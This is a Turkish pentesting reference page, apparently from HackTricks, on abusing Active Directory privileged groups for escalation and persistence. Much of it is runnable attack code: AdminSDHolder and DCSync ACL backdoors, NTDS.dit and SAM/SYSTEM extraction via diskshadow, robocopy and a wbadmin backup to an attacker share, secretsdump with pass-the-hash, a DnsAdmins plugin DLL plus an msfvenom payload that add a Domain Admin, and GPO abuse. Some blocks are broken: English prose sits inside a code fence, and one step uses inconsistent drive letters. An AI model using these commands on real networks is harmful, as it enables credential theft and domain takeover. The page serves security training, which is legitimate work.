# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Yönetim ayrıcalıklarına sahip iyi bilinen gruplar

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Bu grup, domain üzerinde yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca Domain Controller'a (DC) yerel oturum açmayı etkinleştirir.

Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcıların eklenmesine ve DC'ye yerel oturum açılmasına izin verilir.<sup>[[1]](#references)</sup>

## AdminSDHolder grubu

**AdminSDHolder** grubunun Access Control List (ACL) değeri kritik öneme sahiptir; çünkü Active Directory içindeki yüksek ayrıcalıklı gruplar da dahil olmak üzere tüm "protected groups" için izinleri belirler. Bu mekanizma, yetkisiz değişiklikleri engelleyerek bu grupların güvenliğini sağlar.

Bir attacker, **AdminSDHolder** grubunun ACL değerini değiştirerek standart bir kullanıcıya tam izinler verebilir. Bu, söz konusu kullanıcıya tüm protected groups üzerinde tam kontrol sağlar. Bu kullanıcının izinleri değiştirilir veya kaldırılırsa, sistemin tasarımı nedeniyle bir saat içinde otomatik olarak yeniden uygulanır.<sup>[[14]](#references)</sup>

Güncel Windows Server documentation, çeşitli yerleşik operator groups'ları hâlâ **protected** nesneler olarak değerlendirir (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` vb.). **SDProp** süreci varsayılan olarak her 60 dakikada bir **PDC Emulator** üzerinde çalışır, `adminCount=1` değerini atar ve protected nesnelerde inheritance'ı devre dışı bırakır. Bu durum hem persistence için hem de protected group'tan çıkarılmış olmasına rağmen inheritance kullanmayan ACL'yi hâlâ koruyan stale privileged users'ları tespit etmek için yararlıdır.<sup>[[12]](#references)</sup>

Üyeleri incelemek ve izinleri değiştirmek için kullanılan komutlar şunlardır:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Geri yükleme sürecini hızlandırmak için bir script mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla ayrıntı için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.

## AD Recycle Bin

Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına olanak tanır ve bu nesneler hassas bilgileri açığa çıkarabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinen nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPN'leri veya daha sonra başka bir operator tarafından geri yüklenebilecek silinmiş ayrıcalıklı bir grubun DN'sini açığa çıkarabilir.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Erişimi

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir parçası olmadığı sürece kısıtlıdır; bu grup üyeliği erişim düzeyini değiştirir.

### Yetki Yükseltme

Sysinternals araçlarındaki `PsService` veya `sc` kullanılarak servis izinleri incelenebilir ve değiştirilebilir. Örneğin `Server Operators` grubu, belirli servisler üzerinde tam denetime sahiptir; bu da keyfi komutların çalıştırılmasına ve yetki yükseltmeye olanak tanır:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu ve yükseltilmiş ayrıcalıklar elde etmek için servislerin değiştirilebilmesini ortaya koyar.

## Backup Operators

`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları sayesinde `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, açık izinler olmadan bile `FILE_FLAG_BACKUP_SEMANTICS` bayrağını kullanarak klasörler arasında geçiş yapmayı, klasörleri listelemeyi ve dosyaları kopyalamayı mümkün kılar. Bu işlem için belirli script'lerin kullanılması gerekir.<sup>[[1]](#references)</sup>

Grup üyelerini listelemek için şu komutu çalıştırın:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıklardan yerel olarak yararlanmak için aşağıdaki adımlar uygulanır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` öğesini etkinleştirin ve doğrulayın:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Örneğin, kısıtlı dizinlerdeki dosyalara erişin ve bunları kopyalayın:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Saldırısı

Domain Controller'ın dosya sistemine doğrudan erişim, etki alanı kullanıcıları ve bilgisayarlarına ait tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.

#### diskshadow.exe kullanarak

1. `C` sürücüsünün bir shadow copy'sini oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. `NTDS.dit` dosyasını shadow copy'den kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash retrieval için `SYSTEM` ve `SAM` dosyalarını çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` içindeki tüm hash'leri alın:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Extraction sonrası: Pass-the-Hash ile DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe Kullanarak

1. Saldırgan makinedeki SMB server için NTFS filesystem kurun ve hedef makinede SMB credentials bilgilerini cache'leyin.
2. System backup ve `NTDS.dit` extraction için `wbadmin.exe` kullanın:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için [IPPSEC ile DEMO VIDEOSU](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) sayfasına bakın.

## DnsAdmins

**DnsAdmins** grubunun üyeleri, ayrıcalıklarını kullanarak DNS server üzerinde SYSTEM privileges ile rastgele bir DLL yükleyebilir. DNS server'lar genellikle Domain Controllers üzerinde barındırıldığından, bu yetenek önemli bir exploitation potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için şunu kullanın:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Rastgele DLL çalıştırma (CVE‑2021‑40469)

> [!NOTE]
> Bu güvenlik açığı, SYSTEM ayrıcalıklarıyla DNS hizmetinde (genellikle DC'lerin içinde) rastgele kod çalıştırılmasına olanak tanır. Bu sorun 2021'de düzeltildi.

Üyeler, aşağıdaki gibi komutları kullanarak DNS sunucusuna (yerel olarak veya uzak bir share üzerinden) rastgele bir DLL yükletebilir:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL'nin yüklenmesi için DNS hizmetinin yeniden başlatılması (ek izinler gerektirebilir) gerekir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Bu saldırı vektörü hakkında daha fazla bilgi için ired.team'e başvurun.

#### Mimilib.dll

Komut çalıştırmak için mimilib.dll kullanmak ve belirli komutları veya reverse shell'leri çalıştıracak şekilde değiştirmek de mümkündür. [Daha fazla bilgi için bu gönderiye göz atın](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).<sup>[[15]](#references)</sup>

### MitM için WPAD Kaydı

DnsAdmins, global query block list'i devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak DNS kayıtlarını manipüle edebilir ve Man-in-the-Middle (MitM) saldırıları gerçekleştirebilir. Spoofing yapmak ve ağ trafiğini yakalamak için Responder veya Inveigh gibi araçlar kullanılabilir.

### Event Log Readers
Üyeler event log'lara erişebilir ve plaintext parolalar veya command execution ayrıntıları gibi hassas bilgileri bulabilir:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Bu grup, domain nesnesi üzerindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync ayrıcalıkları sağlayabilir. Bu gruptan yararlanarak privilege escalation gerçekleştirmeye yönelik teknikler Exchange-AD-Privesc GitHub repo'sunda ayrıntılı olarak açıklanmıştır.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Bu grubun bir üyesi gibi hareket edebiliyorsanız, klasik kötüye kullanım, saldırgan tarafından kontrol edilen bir principal'a [DCSync](dcsync.md) için gereken replikasyon haklarını vermektir:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Tarihsel olarak **PrivExchange**, posta kutusu erişimini, zorlanmış Exchange authentication'ını ve LDAP relay'i zincirleyerek aynı primitive'e ulaşılmasını sağladı. Bu relay yolu azaltılmış olsa bile, `Exchange Windows Permissions` grubuna doğrudan üyelik veya bir Exchange server'ının kontrolü, domain replication rights elde etmek için yüksek değerli bir yol olmaya devam eder.

## Hyper-V Administrators

Hyper-V Administrators, Hyper-V'ye tam erişime sahiptir ve bu erişim, virtualized Domain Controller'ların kontrolünü ele geçirmek için exploit edilebilir. Buna canlı DC'leri clone'lamak ve `NTDS.dit` dosyasından NTLM hash'lerini çıkarmak dahildir.

### Exploitation Example

Pratikteki abuse genellikle eski host-level LPE trick'lerinden ziyade **DC disklerine/checkpoint'lerine offline erişim** şeklindedir. Hyper-V host'una erişimi olan bir operator, virtualized Domain Controller için checkpoint alabilir veya onu export edebilir, VHDX'i mount edebilir ve guest içindeki LSASS'e dokunmadan `NTDS.dit`, `SYSTEM` ve diğer secret'ları extract edebilir:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Buradan, `Backup Operators` workflow'unu yeniden kullanarak `Windows\NTDS\ntds.dit` dosyasını ve registry hives'larını offline olarak kopyalayın.

## Group Policy Creators Owners

Bu grup, üyelerinin domain içinde Group Policies oluşturmasına izin verir. Ancak üyeleri, group policies'leri kullanıcılara veya gruplara uygulayamaz ya da mevcut GPO'ları düzenleyemez.

Buradaki önemli ayrıntı, **creator'ın yeni GPO'nun sahibi olması** ve genellikle sonrasında bu GPO'yu düzenlemek için yeterli haklara sahip olmasıdır. Bu nedenle aşağıdaki durumlarda bu grup ilgi çekicidir:

- kötü amaçlı bir GPO oluşturup bir admin'i bunu hedef OU/domain'e bağlamaya ikna edebiliyorsanız
- oluşturduğunuz ve zaten yararlı bir yere bağlı olan bir GPO'yu düzenleyebiliyorsanız
- GPO'ları bağlamanıza izin veren başka bir delegated right'ı abuse edebiliyorsanız; bu grup ise size düzenleme tarafını sağlıyorsa

Practical abuse genellikle SYSVOL-backed policy files üzerinden bir **Immediate Task**, **startup script**, **local admin membership** veya **user rights assignment** değişikliği eklemek anlamına gelir.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL` üzerinden GPO'yu manuel olarak düzenliyorsanız, değişikliğin tek başına yeterli olmadığını unutmayın: `versionNumber`, `GPT.ini` ve bazen `gPCMachineExtensionNames` de güncellenmelidir; aksi takdirde istemciler politika yenilemesini yok sayar.<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange**'in dağıtıldığı ortamlarda, **Organization Management** olarak bilinen özel bir grup önemli yetkilere sahiptir. Bu grup, **tüm domain kullanıcılarının mailbox'larına erişme** ayrıcalığına sahiptir ve **'Microsoft Exchange Security Groups'** Organizational Unit'i (OU) üzerinde **tam denetim** bulundurur. Bu denetim, privilege escalation için kullanılabilecek **`Exchange Windows Permissions`** grubunu da kapsar.

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** grubunun üyelerine, **Domain Controller'a local olarak log on olma**, onu kapatma ve printer'ları yönetme imkanı sağlayan **`SeLoadDriverPrivilege`** dahil olmak üzere çeşitli ayrıcalıklar tanınır. Bu ayrıcalıklardan yararlanmak için, özellikle **`SeLoadDriverPrivilege`** unelevated bir context altında görünür değilse, User Account Control (UAC) bypass gereklidir.<sup>[[1]](#references)</sup>

Bu grubun üyelerini listelemek için aşağıdaki PowerShell command kullanılır:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
On Domain Controllers bu grup tehlikelidir, çünkü varsayılan Domain Controller Policy, **`SeLoadDriverPrivilege`** ayrıcalığını `Print Operators` grubuna verir. Bu grubun bir üyesi için elevated token elde ederseniz, ayrıcalığı etkinleştirip imzalı ancak güvenlik açığı bulunan bir driver yükleyerek kernel/SYSTEM seviyesine geçebilirsiniz.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Token işlemleriyle ilgili ayrıntılar için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) bölümüne bakın.

#### Remote Desktop Users

Bu grubun üyelerine, Remote Desktop Protocol (RDP) aracılığıyla PC'lere erişim izni verilir. Bu üyeleri enumerate etmek için PowerShell komutları kullanılabilir:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP exploitation hakkında daha fazla bilgi, özel pentesting kaynaklarında bulunabilir.

#### Remote Management Users

Üyeler, **Windows Remote Management (WinRM)** üzerinden bilgisayarlara erişebilir. Bu üyelerin listelenmesi şu şekilde gerçekleştirilir:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** ile ilgili exploitation teknikleri için ilgili dokümantasyona başvurulmalıdır.

#### Server Operators

Bu grup, backup ve restore yetkileri, sistem saatini değiştirme ve sistemi kapatma dahil olmak üzere Domain Controller'lar üzerinde çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir.<sup>[[1]](#references)</sup> Üyeleri enumerate etmek için kullanılan komut:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Etki Alanı Denetleyicilerinde, `Server Operators` genellikle **hizmetleri yeniden yapılandırmak veya başlatmak/durdurmak** için yeterli yetkileri devralır ve varsayılan DC policy aracılığıyla `SeBackupPrivilege`/`SeRestorePrivilege` ayrıcalıklarını da alır. Uygulamada bu, onları **service-control abuse** ile **NTDS extraction** arasında bir köprü haline getirir:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Bir service ACL bu gruba değiştirme/başlatma hakları veriyorsa, service'i rastgele bir command çalıştıracak şekilde yapılandırın, `LocalSystem` olarak başlatın ve ardından özgün `binPath` değerini geri yükleyin. Service control kısıtlanmışsa, `NTDS.dit` dosyasını kopyalamak için yukarıdaki `Backup Operators` tekniklerine başvurun.

## Referanslar

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
